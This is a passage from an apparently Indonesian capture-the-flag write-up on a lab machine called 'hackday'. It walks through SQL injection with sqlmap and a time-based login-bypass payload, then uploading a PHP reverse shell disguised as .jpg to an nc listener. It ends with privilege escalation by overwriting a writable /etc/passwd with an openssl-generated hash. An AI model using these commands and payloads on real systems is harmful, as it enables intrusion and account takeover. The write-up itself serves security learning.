<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">fytdinfovbujoh</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">gzuejogpwcvkpi</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">havfkphqxdwlqj</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">ibwglqiryexmrk</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">jcxhmrjszfynsl</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">kdyinsktagzotm</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">lezjotlubhapun</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">mfakpumvcibqvo</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">ngblqvnwdjcrwp</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">ohcmrwoxekdsxq</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">pidnsxpyfletyr</span> <span class="p">:</span> <span class="mi">165</span>
<span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">qjeotyqzgmfuzs</span> <span class="p">:</span> <span class="mi">165</span></code></pre></figure>

<h2 id="very-secure-bank-website">4. Very Secure BANK Website</h2>

<p>Apabila kita mengakses directory <em>unisxcudkqjydw</em>, kita akan mendapatkan <code>path</code> dimana website “Very Secure BANK” berada.</p>

<p><img src="/img/hackday/very_secure_bank_web.png" alt="Sql-Injection-error" class="img-responsive" /></p>

<p>Setelah dilakukan investigasi “asal-asalan”, halaman login website “Very Secure BANK” vulnerable terhadap serangan <code>POST SQL Injection</code> tepatnya pada parameter username</p>

<p><img src="/img/hackday/sqli_error.png" alt="Sql-Injection-error" class="img-responsive" /></p>

<h2 id="post-sql-injection-attack-using-sqlmap">5. POST SQL Injection Attack Using Sqlmap</h2>

<p>Dengan bantuan <code>sqlmap</code> kita dengan mudah dapat mengeksploitasi bug SQL Injection tersebut</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="err">➜</span>  <span class="n">hackday</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">:</span><span class="mi">8008</span><span class="o">/</span><span class="n">unisxcudkqjydw</span><span class="o">//</span><span class="n">vulnbank</span><span class="o">/</span><span class="n">client</span><span class="o">/</span><span class="n">login</span><span class="p">.</span><span class="n">php</span> <span class="o">--</span><span class="n">data</span> <span class="s2">&quot;username=admin*&amp;password=admin&quot;</span> <span class="o">-</span><span class="n">p</span> <span class="n">username</span> <span class="o">--</span><span class="n">dbs</span> <span class="o">-</span><span class="n">T4</span> <span class="o">--</span><span class="n">level</span> <span class="mi">4</span> <span class="o">--</span><span class="n">risk</span> <span class="mi">3</span>
         <span class="n">_</span>
 <span class="n">___</span> <span class="n">___</span><span class="o">|</span> <span class="o">|</span><span class="n">_____</span> <span class="n">___</span> <span class="n">___</span>  <span class="err">{</span><span class="mi">1</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">0</span><span class="c1">#dev}</span>
<span class="o">|</span><span class="n">_</span> <span class="o">-|</span> <span class="p">.</span> <span class="o">|</span> <span class="o">|</span>     <span class="o">|</span> <span class="p">.</span><span class="s1">&#39;| . |</span>
<span class="s1">|___|_  |_|_|_|_|__,|  _|</span>
<span class="s1">      |_|           |_|   http://sqlmap.org</span>

<span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#39;</span><span class="n">s</span> <span class="n">responsibility</span> <span class="k">to</span> <span class="n">obey</span> <span class="k">all</span> <span class="n">applicable</span> <span class="n">local</span><span class="p">,</span> <span class="n">state</span> <span class="k">and</span> <span class="n">federal</span> <span class="n">laws</span><span class="p">.</span> <span class="n">Developers</span> <span class="n">assume</span> <span class="n">no</span> <span class="n">liability</span> <span class="k">and</span> <span class="n">are</span> <span class="k">not</span> <span class="n">responsible</span> <span class="k">for</span> <span class="n">any</span> <span class="n">misuse</span> <span class="k">or</span> <span class="n">damage</span> <span class="n">caused</span> <span class="k">by</span> <span class="n">this</span> <span class="n">program</span>

<span class="p">[</span><span class="o">*</span><span class="p">]</span> <span class="k">starting</span> <span class="n">at</span> <span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">36</span>

<span class="n">custom</span> <span class="n">injection</span> <span class="n">marking</span> <span class="k">character</span> <span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">)</span> <span class="n">found</span> <span class="k">in</span> <span class="k">option</span> <span class="s1">&#39;--data&#39;</span><span class="p">.</span> <span class="n">Do</span> <span class="n">you</span> <span class="n">want</span> <span class="k">to</span> <span class="n">process</span> <span class="n">it</span><span class="o">?</span> <span class="p">[</span><span class="n">Y</span><span class="o">/</span><span class="n">n</span><span class="o">/</span><span class="n">q</span><span class="p">]</span> <span class="n">Y</span>
<span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">38</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">resuming</span> <span class="n">back</span><span class="o">-</span><span class="n">end</span> <span class="n">DBMS</span> <span class="s1">&#39;mysql&#39;</span> 
<span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">38</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">testing</span> <span class="n">connection</span> <span class="k">to</span> <span class="n">the</span> <span class="n">target</span> <span class="n">URL</span>
<span class="o">-</span><span class="c1">--</span>
<span class="c1">Parameter: #1* ((custom) POST)</span>
    <span class="n">Type</span><span class="p">:</span> <span class="k">AND</span><span class="o">/</span><span class="k">OR</span> <span class="kt">time</span><span class="o">-</span><span class="n">based</span> <span class="n">blind</span>
    <span class="n">Title</span><span class="p">:</span> <span class="n">MySQL</span> <span class="o">&gt;=</span> <span class="mi">5</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">12</span> <span class="k">RLIKE</span> <span class="kt">time</span><span class="o">-</span><span class="n">based</span> <span class="nf">blind</span> <span class="p">(</span><span class="k">SELECT</span> <span class="o">-</span> <span class="n">comment</span><span class="p">)</span>
    <span class="n">Payload</span><span class="p">:</span> <span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="s1">&#39; RLIKE (SELECT * FROM (SELECT(SLEEP(5)))rtEp)#&amp;password=admin</span>
<span class="s1">---</span>
<span class="s1">[23:30:39] [INFO] the back-end DBMS is MySQL</span>
<span class="s1">web server operating system: Linux Ubuntu</span>
<span class="s1">web application technology: Apache 2.4.18, PHP 7.0.8</span>
<span class="s1">back-end DBMS: MySQL 5.0.12</span>
<span class="s1">[23:30:39] [INFO] fetching database names</span>
<span class="s1">[23:30:39] [INFO] fetching number of databases</span>
<span class="s1">[23:30:39] [WARNING] (case) time-based comparison requires larger statistical model, please wait.............................. (done)</span>
<span class="s1">[23:30:39] [WARNING] it is very important to not stress the network adapter during usage of time-based payloads to prevent potential disruptions </span>
<span class="s1">[23:30:39] [WARNING] in case of continuous data retrieval problems you are advised to try a switch &#39;</span><span class="o">--</span><span class="n">no</span><span class="o">-</span><span class="n">cast</span><span class="s1">&#39; or switch &#39;</span><span class="o">--</span><span class="n">hex</span><span class="err">&#39;</span>
<span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">ERROR</span><span class="p">]</span> <span class="n">unable</span> <span class="k">to</span> <span class="n">retrieve</span> <span class="n">the</span> <span class="n">number</span> <span class="n">of</span> <span class="k">databases</span>
<span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">falling</span> <span class="n">back</span> <span class="k">to</span> <span class="n">current</span> <span class="k">database</span>
<span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">INFO</span><span class="p">]</span> <span class="n">fetching</span> <span class="n">current</span> <span class="k">database</span>
<span class="p">[</span><span class="mi">23</span><span class="p">:</span><span class="mi">30</span><span class="p">:</span><span class="mi">39</span><span class="p">]</span> <span class="p">[</span><span class="n">WARNING</span><span class="p">]</span> <span class="kt">time</span><span class="o">-</span><span class="n">based</span> <span class="n">comparison</span> <span class="n">requires</span> <span class="n">larger</span> <span class="n">statistical</span> <span class="n">model</span><span class="p">,</span> <span class="n">please</span> <span class="n">wait</span><span class="p">..............................</span> <span class="p">(</span><span class="n">done</span><span class="p">)</span></code></pre></figure>

<p>Saya menggunakan <em>payload</em> yang dihasilkan oleh <code>sqlmap</code> untuk login di website Very Secure BANK</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="n">username</span><span class="o">=</span><span class="n">admin</span><span class="err">&#39;</span> <span class="k">RLIKE</span> <span class="p">(</span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="p">(</span><span class="k">SELECT</span><span class="p">(</span><span class="nf">SLEEP</span><span class="p">(</span><span class="mi">5</span><span class="p">)))</span><span class="n">rtEp</span><span class="p">)</span><span class="c1">#</span>
<span class="n">password</span><span class="o">=</span><span class="n">admin</span></code></pre></figure>

<p>Dengan menggunakan username dan password diatas, voila ! <em>Access Granted</em>…</p>

<p><img src="/img/hackday/loged_in_website.png" alt="web-logged-in" class="img-responsive" /></p>

<h2 id="plant-the-backdoor">6. Plant The Backdoor</h2>

<p>Dengan memanfaatkan <em>Upload Form</em> dibagian <em>Contact Support</em>, kita bisa memasang <em>PHP Backdoor</em>. Untuk diketahui, Upload Form tersebut melakukan <em>filtering</em> terhadap ekstensi file, sehingga hanya file berekstensi <code>.jpg</code> yang dapat diupload. Saya menggunakan <code>php-reverse-shell</code> yang saya dapatkan dari situs <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a> yang sudah direname menjad <code>php-reverse-shell.php.jpg</code>.</p>

<p>Setelah sukses mengupload reverse shell tersebut, saya awal nya berpikir <code>php-reverse-shell.php.jpg</code> tidak bisa tereksekusi karena berekstensi <code>.jpg</code>, tapi ternyata <em>Listener</em> <code>nc -vlp 2121</code> mendapatkan koneksi dari reverse shell yang diupload. Hal ini mungkin disebabkan oleh penggunaan fungsi <code>include(file_name)</code> pada PHP sehingga memungkinkan <em>backdoor</em> yang kita upload tereksekusi.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="err">➜</span>  <span class="n">hackday</span> <span class="n">nc</span> <span class="o">-</span><span class="n">vlp</span> <span class="mi">2121</span>
<span class="n">Listening</span> <span class="k">on</span> <span class="p">[</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">]</span> <span class="p">(</span><span class="n">family</span> <span class="mi">0</span><span class="p">,</span> <span class="n">port</span> <span class="mi">2121</span><span class="p">)</span>
<span class="n">Connection</span> <span class="k">from</span> <span class="p">[</span><span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">101</span><span class="p">]</span> <span class="n">port</span> <span class="mi">2121</span> <span class="p">[</span><span class="n">tcp</span><span class="o">/</span><span class="n">iprop</span><span class="p">]</span> <span class="nf">accepted</span> <span class="p">(</span><span class="n">family</span> <span class="mi">2</span><span class="p">,</span> <span class="n">sport</span> <span class="mi">49492</span><span class="p">)</span>
<span class="n">Linux</span> <span class="n">hackday</span> <span class="mi">4</span><span class="p">.</span><span class="mi">4</span><span class="p">.</span><span class="mi">0</span><span class="o">-</span><span class="mi">45</span><span class="o">-</span><span class="n">generic</span> <span class="c1">#66-Ubuntu SMP Wed Oct 19 14:12:37 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux</span>
 <span class="mi">06</span><span class="p">:</span><span class="mi">26</span><span class="p">:</span><span class="mi">55</span> <span class="n">up</span> <span class="mi">30</span> <span class="n">min</span><span class="p">,</span>  <span class="mi">0</span> <span class="n">users</span><span class="p">,</span>  <span class="k">load</span> <span class="n">average</span><span class="p">:</span> <span class="mi">0</span><span class="p">.</span><span class="mi">06</span><span class="p">,</span> <span class="mi">0</span><span class="p">.</span><span class="mi">04</span><span class="p">,</span> <span class="mi">0</span><span class="p">.</span><span class="mi">01</span>
<span class="n">USER</span>     <span class="n">TTY</span>      <span class="k">FROM</span>             <span class="n">LOGIN</span><span class="o">@</span>   <span class="n">IDLE</span>   <span class="n">JCPU</span>   <span class="n">PCPU</span> <span class="n">WHAT</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">33</span><span class="p">(</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">)</span>
<span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="p">:</span> <span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="err">&#39;</span><span class="n">t</span> <span class="n">access</span> <span class="n">tty</span><span class="p">;</span> <span class="n">job</span> <span class="n">control</span> <span class="n">turned</span> <span class="n">off</span>
<span class="err">$</span> </code></pre></figure>

<h2 id="priviliege-escalation">7. Priviliege Escalation</h2>
<p>Setelah mendapatkan Shell Access hasil dari <em>reverse connection</em> sebelumnya, saya melakukan <em>Spawning TTY Shell</em> agar mendapatkan shell yang lebih baik. Berbagai teknik untuk Spawning TTY Shell dapat dilihat disitus <a href="http://netsec.ws/?p=337">Netsec</a>.
Dikarenakan python (versi 2) tidak terinstall, tapi python3 yang terinstall kita tetap bisa menspawning karena syntax nya sama.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="err">$</span> <span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> </code></pre></figure>

<p>Untuk next step saya mengikuti <em>Basic Priviliege Escalation</em> di blog <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">g0tmilk</a></p>

<p>Saya mencoba mencari <em>suid permission</em>  menggunakan command <code>find / -perm -2000 2&gt;/dev/null</code> tetapi tidak menemukan menarik.</p>

<h4 id="so-what-we-must-to-do-">So What We Must To Do ?</h4>
<p>Saat mencoba mencari <em>Writable File</em> menggunakan command <code>find / -xdev -writable 2&gt;/dev/null</code> file <code>/etc/passwd</code> berada dipaling atas.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="o">@</span><span class="n">hackday</span><span class="p">:</span><span class="o">/</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">xdev</span> <span class="o">-</span><span class="n">writable</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">xdev</span> <span class="o">-</span><span class="n">writable</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="no">null</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span>
<span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">system</span><span class="o">/</span><span class="n">inetd</span><span class="p">.</span><span class="n">service</span>
<span class="o">/</span><span class="n">tmp</span></code></pre></figure>

<p>Apabila file <code>/etc/passwd</code> dalam keadaan Wriable itu akan menjadi bencana, karena kita dapat dengan mudah mengganti password user active di system hackday.</p>

<p>Saya menyalin isi dari file /etc/passwd ke local system saya sehingga dapat dengan mudah mengedit password.
Untuk mengenerate password, dapat digunakan <code>openssl</code>.</p>

<figure class="highlight"><pre><code class="language-mysql" data-lang="mysql"><span></span><span class="err">➜</span>  <span class="n">hackday</span> <span class="n">openssl</span> <span class="n">passwd</span> <span class="o">-</span><span class="mi">1</span> <span class="n">passw0rd</span>
<span class="err">$</span><span class="mi">1</span><span class="err">$</span><span class="n">FhytX</span><span class="p">.</span><span class="n">J</span><span class="o">/</span><span class="err">$</span><span class="n">cb</span><span class="o">/</span><span class="n">k7Fmg4LlTu9f8XDgux1</span>
<span class="err">➜</span>  <span class="n">Web</span> <span class="n">cat</span> <span class="n">passwd</span>
<span class="n">root</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">root</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span>
<span class="n">daemon</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="mi">1</span><span class="p">:</span><span class="n">daemon</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">bin</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sys</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="mi">3</span><span class="p">:</span><span class="n">sys</span><span class="p">:</span><span class="o">/</span><span class="n">dev</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">sync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">4</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">sync</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sync</span>
<span class="n">games</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">5</span><span class="p">:</span><span class="mi">60</span><span class="p">:</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">games</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">man</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">6</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">cache</span><span class="o">/</span><span class="n">man</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">lp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="mi">7</span><span class="p">:</span><span class="n">lp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">lpd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">mail</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="mi">8</span><span class="p">:</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">mail</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">news</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="mi">9</span><span class="p">:</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">news</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">uucp</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">spool</span><span class="o">/</span><span class="n">uucp</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="mi">13</span><span class="p">:</span><span class="n">proxy</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="n">www</span><span class="o">-</span><span class="n">data</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">www</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">backup</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="mi">34</span><span class="p">:</span><span class="n">backup</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">backups</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">list</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="mi">38</span><span class="p">:</span><span class="n">Mailing</span> <span class="n">List</span> <span class="n">Manager</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">list</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">irc</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">ircd</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">gnats</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="mi">41</span><span class="p">:</span><span class="n">Gnats</span> <span class="n">Bug</span><span class="o">-</span><span class="n">Reporting</span> <span class="nf">System</span> <span class="p">(</span><span class="n">admin</span><span class="p">):</span><span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">gnats</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">nobody</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="mi">65534</span><span class="p">:</span><span class="n">nobody</span><span class="p">:</span><span class="o">/</span><span class="n">nonexistent</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span><span class="o">/</span><span class="n">nologin</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">timesync</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">100</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="n">systemd</span> <span class="kt">Time</span> <span class="n">Synchronization</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">network</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">101</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Network</span> <span class="n">Management</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">netif</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">resolve</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">102</span><span class="p">:</span><span class="mi">104</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Resolver</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="o">/</span><span class="n">resolve</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
<span class="n">systemd</span><span class="o">-</span><span class="n">bus</span><span class="o">-</span><span class="n">proxy</span><span class="p">:</span><span class="n">x</span><span class="p">:</span><span class="mi">103</span><span class="p">:</span><span class="mi">105</span><span class="p">:</span><span class="n">systemd</span> <span class="n">Bus</span> <span class="n">Proxy</span><span class="p">,,,:</span><span class="o">/</span><span class="n">run</span><span class="o">/</span><span class="n">systemd</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="no">false</span>
